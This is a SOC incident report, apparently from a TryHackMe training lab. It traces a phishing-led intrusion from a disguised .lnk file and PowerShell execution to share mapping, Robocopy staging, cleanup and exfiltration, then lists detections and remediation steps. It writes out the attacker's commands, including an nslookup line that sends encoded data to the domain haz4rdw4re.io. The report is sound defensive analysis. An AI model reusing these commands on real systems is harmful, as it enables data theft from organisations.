# Detailed SOC Incident Report

## Incident Description

This incident involves a phishing-based attack that led to execution of malicious scripts, unauthorized access to internal resources, and data exfiltration from a Windows host (win-3450).

## Initial Access

The attack began with a phishing email sent to [michael.ascot@tryhatme.com](mailto:michael.ascot@tryhatme.com). The email contained urgent financial language and a ZIP attachment named **ImportantInvoice-Febrary.zip**, designed to trick the user into opening it.

## Execution

Upon opening the attachment, a malicious **.lnk file disguised as a PDF** was executed. This triggered **PowerShell execution from a temporary directory**, indicating suspicious behavior. The PowerShell process executed a malicious script, likely used for post-exploitation.

## Post-Exploitation Activity

PowerShell was used as the primary attack tool. It executed commands, generated obfuscated output, and created files in the system. A directory named **exfiltration** was created in the Downloads folder, indicating data staging.

## Lateral Movement / Data Access

The attacker mapped a network share using:
net use Z: \FILESRV-01\SSF-FinancialRecords

This provided access to sensitive financial data stored on the file server.

## Data Staging

The attacker used Robocopy to copy files:
Robocopy.exe . C:\Users\michael.ascot\downloads\exfiltration /E

This recursively copied all files from the mapped network drive to the local system.

## Cleanup Activity

The mapped drive was removed using:
net use Z: /delete

This indicates an attempt to remove evidence of access.

## Data Exfiltration

The attacker used DNS-based exfiltration via:
nslookup.exe <encoded_data>.haz4rdw4re.io

Encoded subdomains indicate data was split into chunks and transmitted through DNS queries.

## Detection & Alerts

Multiple Sysmon alerts were triggered:

* PowerShell spawning child processes (net.exe, Robocopy.exe, nslookup.exe)
* Execution from Downloads and Temp directories
* Suspicious command-line arguments
* Network activity to external domain

## False Positives Observed

Several email alerts were classified as false positives:

* Advertisements
* Marketing emails
* Spam messages

These were benign and required no escalation.

## Conclusion

This attack demonstrates a full attack lifecycle:
Phishing → Execution → PowerShell abuse → Network access → Data staging → Cleanup → DNS exfiltration

The attacker successfully used legitimate tools to avoid detection, emphasizing the importance of behavior-based monitoring and strong SOC practices.

## Remediation Actions

* Isolate the affected host
* Terminate malicious processes
* Block malicious domain (haz4rdw4re.io)
* Reset user credentials
* Audit file server access
* Improve email filtering rules
* Monitor DNS traffic for anomalies
